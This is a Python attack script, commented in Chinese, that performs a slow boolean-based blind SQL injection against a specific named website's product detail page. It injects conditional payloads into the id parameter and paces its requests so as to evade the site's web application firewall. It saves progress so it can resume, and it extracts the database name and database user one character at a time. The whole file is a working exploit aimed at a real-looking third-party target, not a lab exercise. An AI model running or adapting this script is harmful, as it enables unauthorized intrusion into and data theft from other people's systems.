#!/usr/bin/env python3
"""yijing_slow_bg.py - 极慢速布尔盲注(自适应封禁, 断点续传)
通道: id=687' and if(条件,687,0)#   真=含"产品展示模块"
极慢速: 每请求 sleep 8s; 封禁时暂停5分钟自适应等待
"""
import urllib.request, urllib.parse, ssl, re, time, sys, json, os

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='
TRUE_MARK = '产品展示模块'
LOG = '/tmp/yijing_slow.log'
STATE = '/tmp/yijing_slow_state.json'
SLEEP = 15         # 每请求间隔秒数(极慢速,避免频率封禁)
BAN_SLEEP = 600    # 封禁等待秒数(10分钟,让WAF风险评分降下来)

def log(msg):
    line = '[%s] %s' % (time.strftime('%m-%d %H:%M:%S'), msg)
    with open(LOG, 'a') as f:
        f.write(line + '\n')
    print(line, flush=True)

def q(payload):
    """返回 True/False/'BAN'/'ERR'"""
    url = BASE + urllib.parse.quote(payload, safe='')
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=20, context=ctx)
        b = r.read(80000).decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        b = e.read(80000).decode('utf-8', 'ignore')
    except Exception:
        return 'ERR'
    if '云网盾' in b or '疑似攻击' in b or '拦截' in b or 'WTS-WAF' in b:
        return 'BAN'
    if 'Invalid SQL' in b or 'MySQL Error' in b:
        return 'ERR'
    return TRUE_MARK in b

def test(cond):
    """带极慢速降速 + 封禁自适应的测试"""
    while True:
        r = q("687' and if(%s,687,0)#" % cond)
        if r == 'BAN':
            log('检测到封禁, 暂停 %ds 等待恢复...' % BAN_SLEEP)
            time.sleep(BAN_SLEEP)
            continue
        time.sleep(SLEEP)
        return r  # True/False/ERR

def load_state():
    if os.path.exists(STATE):
        try:
            return json.load(open(STATE))
        except: pass
    return {'db_len': None, 'db': [], 'user_len': None, 'user': [], 'phase': 'init'}

def save_state(s):
    json.dump(s, open(STATE, 'w'))

def get_len(expr, name):
    for n in range(1, 65):
        r = test("length(%s)=%d" % (expr, n))
        if r is True:
            log('%s 长度 = %d' % (name, n))
            return n
        if r == 'ERR':
            time.sleep(SLEEP)
    log('%s 长度提取失败' % name)
    return None

def get_char(expr, pos, name, charsets):
    """等值遍历提取单字符ascii, charsets=[[优先字符集],...]"""
    # 合并字符集 + 兜底完整0-255
    tried = set()
    for cs in charsets:
        for ch in cs:
            n = ord(ch)
            if n in tried: continue
            tried.add(n)
            r = test("ascii(substr(%s,%d,1))=%d" % (expr, pos, n))
            if r is True:
                return n
            if r == 'ERR':
                time.sleep(SLEEP)
    # 兜底: 剩余ascii
    for n in range(256):
        if n in tried: continue
        r = test("ascii(substr(%s,%d,1))=%d" % (expr, pos, n))
        if r is True:
            return n
        if r == 'ERR':
            time.sleep(SLEEP)
    return None

# 字符集: 小写字母数字下划线优先, 大写, 中文UTF-8首字节, 特殊
CS_COMMON = 'abcdefghijklmnopqrstuvwxyz0123456789_'
CS_UPPER = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
CS_SPECIAL = '@.-:/\\'
CS_CJK_BYTES = [chr(n) for n in range(224, 240)]  # 中文UTF-8首字节(用chr占位)

def dump_str(expr, name, state_key_len, state_key_val, maxlen=64):
    st = load_state()
    if st[state_key_len] is None:
        ln = get_len(expr, name)
        if ln is None or ln > maxlen:
            return None
        st[state_key_len] = ln
        save_state(st)
    ln = st[state_key_len]
    arr = st[state_key_val]
    for i in range(len(arr)+1, ln+1):
        c = get_char(expr, i, name, [CS_COMMON, CS_UPPER, CS_SPECIAL, CS_CJK_BYTES])
        if c is None:
            log('%s 第%d字符提取失败' % (name, i))
            arr.append(-1)
        else:
            arr.append(c)
            log('%s [%d/%d] ascii=%d (%s)' % (name, i, ln, c, chr(c) if 32<=c<127 else '?'))
        st[state_key_val] = arr
        save_state(st)
    return arr

def ascii_to_str(arr):
    if not arr: return '?'
    try:
        b = bytes(x for x in arr if 0 <= x < 256)
        return b.decode('utf-8')
    except:
        return ''.join(chr(x) if 32<=x<127 else '?' for x in arr)

if __name__ == '__main__':
    log('=== 极慢速盲注启动 ===')
    # 通道自检
    t = test('1=1')
    f = test('1=2')
    log('通道自检: 真=%s 假=%s' % (t, f))
    if t is not True or f is not False:
        log('通道不稳, 检查是否封禁')
        # 等封禁解除后重试
        while True:
            log('等待封禁解除, sleep 600s')
            time.sleep(600)
            t = test('1=1')
            f = test('1=2')
            if t is True and f is False:
                log('通道恢复!')
                break

    # 提取 database()
    log('=== 提取 database() ===')
    db_arr = dump_str('database()', 'database', 'db_len', 'db')
    if db_arr:
        log('database() = %s (ascii=%s)' % (ascii_to_str(db_arr), db_arr))

    # 提取 user()
    log('=== 提取 user() ===')
    user_arr = dump_str('user()', 'user', 'user_len', 'user')
    if user_arr:
        log('user() = %s (ascii=%s)' % (ascii_to_str(user_arr), user_arr))

    log('=== 全部提取完成 ===')
